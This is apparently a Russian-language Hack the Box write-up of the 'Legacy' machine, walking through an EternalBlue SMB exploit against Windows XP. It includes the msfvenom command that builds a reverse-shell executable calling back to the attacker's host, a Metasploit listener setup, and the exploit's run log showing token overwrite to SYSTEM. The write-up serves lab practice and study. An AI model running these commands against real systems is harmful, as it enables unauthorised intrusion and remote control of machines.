
# Вечное синие

Мы уже имели эксплойт, который можно было использовать из [[Writeups/Hack the Box/Boxes/Blue/10 - Eternal Blue|Blue]].

```bash
┌──(mac㉿kali)-[~/Documents/HTB/legacy]
└─$ cp ../blue/exploit.py .
```

Единственное, что нужно было изменить, — это имя пользователя. Я проверил сканирование с помощью `nmap`, и оно показало, что для входа не используется имя пользователя.

Я быстро попытался подключиться к порту 445, чтобы проверить, правильно ли происходит поведение. Я хотел вывести список общих дисков, чтобы знать, к какому из них подключиться, но все методы, которые я попробовал, давали ошибку таймаута:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/legacy]
└─$ smbclient -L \\10.10.10.4
protocol negotiation failed: NT_STATUS_IO_TIMEOUT
──(mac㉿kali)-[~/Documents/HTB/legacy]
└─$ smbclient -L 10.10.10.4 \\\\legacy\\shares
protocol negotiation failed: NT_STATUS_IO_TIMEOUT
```

Так что я просто попробовал подключиться с помощью `smbmap`:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/legacy]
└─$ smbmap -H 10.10.10.4 -u "" -p ""
[+] IP: 10.10.10.4:445	Name: 10.10.10.4                                        
┌──(mac㉿kali)-[~/Documents/HTB/legacy]
└─$ smbmap -H 10.10.10.4 -u null -p ""
[!] Authentication error on 10.10.10.4
```

Похоже, нам нужно указать буквально пустое имя пользователя. Поэтому я изменил `exploit.py`:

![[Pasted image 20210502103619.png]]

Мне также нужно было скопировать `mysmb.py`:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/legacy]
└─$ cp ../blue/mysmb.py .
```

Затем мне нужен был пайлот. Я провел поиск Windows-пайлотов, чтобы узнать, есть ли какие-то специфичные для Windows XP.

```bash
┌──(mac㉿kali)-[~/Documents/HTB/legacy]
└─$ msfvenom -l payload | grep windows
```

Похоже, их нет, поэтому я выбрал самый универсальный пайлот:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/legacy]
└─$ msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.6 lport=9001 -f exe -o shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: shell.exe
```

Затем я изменил скрипт, чтобы загрузить новый пайлот:

![[Pasted image 20210502104328.png]]

Затем я начал слушатель:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/legacy]
└─$ msfconsole -q
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/shell_reverse_tcp
payload => windows/shell_reverse_tcp
msf6 exploit(multi/handler) > set lhost tun0
lhost => tun0
msf6 exploit(multi/handler) > set lport 9001
lport => 9001
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.6:9001 
```

Я хотел увидеть, работает ли эксплойт без предварительного выбора named pipe, поскольку казалось, что есть способ найти его. Поэтому я запустил его просто указав IP:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/legacy]
└─$ python2 exploit.py 10.10.10.4
Target OS: Windows 5.1
Using named pipe: spoolss
Groom packets
attempt controlling next transaction on x86
success controlling one transaction
modify parameter count to 0xffffffff to be able to write backward
leak next transaction
CONNECTION: 0x8209e3c8
SESSION: 0xe10af840
FLINK: 0x7bd48
InData: 0x7ae28
MID: 0xa
TRANS1: 0x78b50
TRANS2: 0x7ac90
modify transaction struct for arbitrary read/write
make this SMB session to be SYSTEM
current TOKEN addr: 0xe11ffcf8
userAndGroupCount: 0x3
userAndGroupsAddr: 0xe11ffd98
overwriting token UserAndGroups
Opening SVCManager on 10.10.10.4....
Creating service WtPn....
Starting service WtPn....
The NETBIOS connection with the remote host timed out.
Removing service WtPn....
ServiceExec Error on: 10.10.10.4
nca_s_proto_error
Done
```

И я получил шелл почти мгновенно:

![[Pasted image 20210502104816.png]]

Похоже, `whoami` не был командой на Windows XP. Я попробовал:

```bash
C:\WINDOWS\system32>echo %USERNAME%
echo %USERNAME%
%USERNAME%
```

Но ничего не вышло. Поэтому я просто начал искать флаги.

![[Pasted image 20210502105024.png]]

![[Pasted image 20210502105053.png]]

Вот коробка!

![[Pasted image 20210502105629.png]]

# Теги

#writeup #cve #windows #oscp-prep
